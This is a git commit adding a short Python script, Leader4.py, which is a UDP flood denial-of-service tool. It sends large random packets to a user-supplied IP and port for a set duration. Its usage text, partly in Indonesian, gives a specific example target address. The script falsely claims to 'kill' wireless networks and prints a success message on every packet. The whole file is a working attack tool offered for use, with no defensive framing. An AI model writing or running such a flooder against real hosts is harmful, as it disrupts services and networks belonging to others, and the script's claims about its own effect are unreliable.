42e9d574cb985eb69a37acead17cc8157dc9f4e0
Mistehcobain <147086666+Mistehcobain@users.noreply.github.com>
2023-10-07 07:24:07 +0800

    Create Leader4.py

---
+++ Leader4.py
@@ -0,0 +1,36 @@
+import os
+import time
+import socket
+import random
+import sys
+os.system("clear")
+def usage():
+	print ("===///====///===///====///===///==//")
+	print ("-Welcome to kill of wireless")
+	print ("___•••____•••___••___•••__")
+	print ("-Author : mister cobain.jr")
+	print ("(masukan perintah python destrokil1.py 194.5.159.78 80 1000)-")
+	
+def flood(victim, vport, duration):
+	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	bytes = random._urandom(20000)
+	timeout = time.time() + duration
+	sent = 3000
+	
+	while 1:
+		if time.time() > timeout:
+			break
+		else:
+			pass
+		client.sendto(bytes, (victim, vport))
+		sent = sent + 1
+		print ("berhasil memutus jaringan wifi && brhasil merusak jaringan wireless!!!")
+def main():
+	
+	if len(sys.argv) != 4:
+		usage()
+	else:
+		flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+		
+if __name__ == '__main__':
+	main()
